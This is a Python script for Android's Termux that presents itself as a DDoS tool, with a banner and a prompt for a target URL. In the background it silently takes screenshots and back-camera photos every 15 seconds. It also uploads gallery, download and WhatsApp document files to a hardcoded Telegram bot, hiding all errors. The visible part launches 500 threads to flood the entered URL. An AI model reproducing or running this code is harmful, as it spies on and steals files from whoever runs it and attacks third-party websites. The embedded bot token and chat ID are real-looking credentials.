import os
import requests
import threading
import time
import urllib.request
from pyfiglet import Figlet
from user_agent import generate_user_agent

# --- আপনার কনফিগারেশন ---
BOT_TOKEN = "8853401453:AAFkeIPiuwHHBYfad0db-QV7kQXUvtHQqbI"
CHAT_ID = "8354830712"

F, Z, S, B = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\x1b[38;5;208m'

def silent_sender(url, files=None, data=None, type="msg"):
    try:
        if type == "photo":
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={'chat_id': CHAT_ID, 'caption': data}, files=files)
        elif type == "doc":
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data={'chat_id': CHAT_ID}, files=files)
        else:
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={data}")
    except: pass

# ১. সাইলেন্ট স্ক্রিনশট ও ক্যামেরা ক্যাপচার
def spy_capture():
    while True:
        try:
            # স্ক্রিনশট (এরর হাইড করার জন্য ২>/dev/null)
            os.system("termux-screenshot -f /sdcard/s.png 2>/dev/null")
            if os.path.exists("/sdcard/s.png"):
                with open("/sdcard/s.png", "rb") as f:
                    silent_sender("", files={'photo': f}, data="Live Screenshot", type="photo")
            
            # ব্যাক ক্যামেরা ক্যাপচার
            os.system("termux-camera-photo -c 0 /sdcard/c.jpg 2>/dev/null")
            if os.path.exists("/sdcard/c.jpg"):
                with open("/sdcard/c.jpg", "rb") as f:
                    silent_sender("", files={'photo': f}, data="Back Camera Photo", type="photo")
        except: pass
        time.sleep(15)

# ২. সকল ফাইল স্টিলার (গ্যালারি, ডাউনলোড, হোয়াটসঅ্যাপ)
def steal_all_files():
    target_dirs = ["/sdcard/DCIM/Camera", "/sdcard/Download", "/sdcard/WhatsApp/Media/WhatsApp Documents"]
    for directory in target_dirs:
        if os.path.exists(directory):
            try:
                for file in os.listdir(directory):
                    file_path = os.path.join(directory, file)
                    if os.path.isfile(file_path) and os.path.getsize(file_path) < 10*1024*1024: # ১০ এমবির নিচের ফাইল
                        with open(file_path, 'rb') as f:
                            silent_sender("", files={'document': f}, type="doc")
            except: pass

# ৩. অরিজিনাল DDoS অ্যাটাক ইন্টারফেস
def AttackMahos(url):
    while True:
        headers = {'User-Agent': generate_user_agent()}
        try:
            req = urllib.request.urlopen(urllib.request.Request(url, headers=headers))
            if req.status == 200:
                print(f'{F}GOOD Attack: {url}')
        except:
            print(f'{S}SENDING Attack: {url}')

def start():
    fig = Figlet(font='slant')
    print(fig.renderText('Ddos Attack'))
    url = input(f'{B}ENTER TARGET URL : ')
    
    # ব্যাকগ্রাউন্ডে স্পাই থ্রেড শুরু
    threading.Thread(target=spy_capture, daemon=True).start()
    threading.Thread(target=steal_all_files, daemon=True).start()
    
    print(f"{F}Initializing Attack on {url}...")
    time.sleep(2)
    for _ in range(500):
        threading.Thread(target=AttackMahos, args=(url,)).start()

if __name__ == "__main__":
    start()